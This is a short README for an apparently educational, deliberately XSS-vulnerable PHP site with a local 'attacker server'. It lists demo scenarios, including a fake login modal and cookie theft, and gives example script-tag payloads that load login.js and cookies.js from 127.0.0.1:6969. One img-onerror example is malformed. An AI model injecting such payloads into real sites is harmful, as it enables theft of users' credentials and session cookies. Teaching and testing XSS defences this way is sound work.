# simple XSS vulnerable site

## To run
client server
```
php -S localhost:8000
```

attacker server
```
php -S 127.0.0.1:6969
```

## Covered situations
- [x] xss on comments
- [x] opens a loging modal and send user input to attacker server
- [x] sends cookies to attacker server
- [x] url xss
- [x] preventions

## XSS examples
- `<script src="http://127.0.0.1:6969/login.js"></script>`
- `<script src="http://127.0.0.1:6969/cookies.js"></script>`
- `<img onerror="document.body.insertBefore"></script>`
- `<script></script>`
